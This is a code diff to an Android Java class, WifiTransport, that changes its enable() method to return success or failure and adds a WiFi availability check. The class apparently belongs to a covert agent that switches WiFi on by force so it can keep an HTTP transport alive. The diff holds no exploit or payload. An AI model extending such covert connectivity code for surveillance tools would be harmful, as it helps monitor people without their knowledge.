@@ -20,8 +20,6 @@ import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerStandby;
-import com.android.dvci.module.ProcessObserver;
-import com.android.dvci.module.StandByObserver;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
 
@@ -83,13 +81,16 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 
 		if (available) {
 			connManager.setNetworkPreference(ConnectivityManager.TYPE_WIFI);
-		}
+		}else{
+            NetworkInfo networkInfo = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+            return networkInfo.isAvailable();
+        }
 
 		return available;
 	}
 
 	@Override
-	public void enable() {
+	public boolean enable() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (enable): forced: " + forced + " wifiState: " + wifi.getWifiState()); //$NON-NLS-1$
 		}
@@ -99,7 +100,7 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 				Check.log(TAG + " (enable): wifi connectivity won't be forced, force flag is disabled"); //$NON-NLS-1$
 			}
 
-			return;
+			return false;
 		}
 
 		// wifi.reconnect();
@@ -111,7 +112,7 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 				Check.log(TAG + " (enable): wifi already on, forcing not required"); //$NON-NLS-1$
 			}
 
-			return;
+			return true;
 		}
 
 		if (Cfg.DEBUG) {
@@ -127,7 +128,7 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 		} else {
 			for (int i = 0; i < 30; i++) {
 				if (isAvailable()) {
-					break;
+					return true;
 				}
 
 				Utils.sleep(1000);
@@ -146,6 +147,8 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (enable) finished " + isAvailable());
 		}
+
+        return false;
 	}
 
 	@Override
